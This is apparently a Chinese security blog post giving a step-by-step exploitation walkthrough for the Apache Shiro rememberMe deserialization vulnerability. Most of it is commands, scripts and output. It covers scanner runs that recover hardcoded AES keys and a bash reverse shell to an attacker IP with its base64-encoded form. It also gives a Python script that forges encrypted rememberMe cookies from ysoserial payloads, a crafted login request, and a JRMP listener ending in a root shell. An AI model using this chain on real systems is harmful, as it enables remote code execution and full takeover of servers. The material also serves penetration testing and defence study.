---
layout: post
toc: true
title: "「Shiro」:Apache-Shiro反序列化漏洞利用整理"
wrench: 2020-07-03
author: Bin4xin
categories:
    - blog
    - 漏洞复现
    - 笔记
    - CVE
    - Java
    - Shiro
permalink: /blog/2020/shiro/Deser/
---

> **漏洞特征**：
> 1. 返回包的`Set-Cookie`中包含`rememberMe=deleteMe`
> 2. Apache Shiro版本 `<= 1.2.4`

现在很多J2EE开发都会采用Shiro框架来做权限控制，框架的优势是出来了，当然就存在劣势——Shiro反序列化漏洞。Shiro是我在参加工作后才慢慢接触到的，从一开始的代码审计，再到黑盒渗透，再到HW行动中都有涉及。

本文分为两个部分：**第一部分**是实践中的理解和经历；**第二部分**是学习过程中的POC复现记录。


## 0x00 验证Shiro反序列化

在判断目标使用了Shiro框架后，进一步验证是否存在反序列化漏洞：
用到的是[Shiroscan](http://www.svenbeast.com/post/tskRKJIPg/){:target="_blank"}脚本，开源在GitHub上：
```bash
python3 shiro_rce.py https://shiro.vuln.ip/login.html "ping x.dnslog.cn"
 ____  _     _          ____                  
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 斯文

Welcome To Shiro反序列化 RCE ! 
[*]  开始检测模块 Class1:CommonsBeanutils1
```
然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：
```bash
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:46:35
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
```
#### 多工具交叉验证

有时ShiroScan扫完没有记录，不代表一定不存在漏洞。换一个能跑密钥的探测脚本再试一次：
- [作者博客](https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/){:target="_blank"}
```bash
python shiro_exp.py https://shiro.vuln.ip/login.html
try CipherKey :4AvVhmFLUs0KTA3Kprsdag==
generator payload done.
send payload ok.
checking.....
checking.....
checking.....
checking.....
vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag==
```
当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。

## 0x01 GetShell

通过上面的步骤确认存在RCE漏洞后，下一步就是反弹Shell获取权限。

**关键点**：Shiro的命令执行需要Base64编码，因为Shiro本身会对rememberMe cookie进行Base64解码。

原始反弹Shell命令：
```bash
bash -i >& /dev/tcp/<attacker_ip>/11111 0>&1
```

编码后：
```bash
bash -c {echo,<command_base64>}|{base64,-d}|{bash,-i}
```

> 编码工具：[Runtime Exec Payloads](http://www.jackson-t.ca/runtime-exec-payloads.html){:target="_blank"}

在脚本上直接添加反弹Shell功能，由脚本自动生成Cookie并发送，省去手动替换的步骤。

攻击机监听端口等待Shell回连：
```bash
nc -lvvp 11111
Listening on [0.0.0.0] (family 0, port 11111)
Connection from <underattack-host> 47274 received!
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6d5a7848dbef:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 0x02 POC构造学习

### ysoserial工具

[ysoserial](https://github.com/frohoff/ysoserial){:target="_blank"}是Java反序列化漏洞利用的神器，用于生成各种Payload。
```bash
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -D skipTests
```
### 生成rememberMe Cookie

使用Python脚本调用ysoserial生成Payload并加密为rememberMe Cookie：
```python
# -*- coding:utf-8 -*-
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```
```bash
# 生成rememberMe Cookie
python shiro-poc.py <attacker_ip>:6666
rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==
```

### 发送Payload

抓包，在登录页面勾选`Remember Me`，截获请求包，替换Cookie中的rememberMe值：

```bash
POST /doLogin HTTP/1.1
underattack-host: underattack-host:8080
Content-Length: 55
Cache-Control: max-age=0
Origin: http://underattack-host:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://underattack-host:8080/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
Connection: close

username=asdmnin&password=asdasd&rememberme=remember-me
```
使用包监听6666端口：
```bash
root@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target# java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,<command_base64>}|{base64,-d}|{bash,-i}'
* Opening JRMP listener on 6666
```
发送请求包后，JRMP监听端口收到回连流量：
```bash
Have connection from /underattack-host:58272
Reading message...
Is DGC call for [[0:0:0, 356978429], [0:0:0, 2006635131]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
Have connection from /underattack-host:58274
Reading message...
Is DGC call for [[0:0:0, 356978429], [0:0:0, -1104978848], [0:0:0, 2006635131]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
```

## 参考

- [Apache Shiro反序列化漏洞分析](https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/){:target="_blank"}
- [ysoserial - Java反序列化Payload生成器](https://github.com/frohoff/ysoserial){:target="_blank"}
- [Runtime Exec Payloads转换](http://www.jackson-t.ca/runtime-exec-payloads.html){:target="_blank"}

以上。

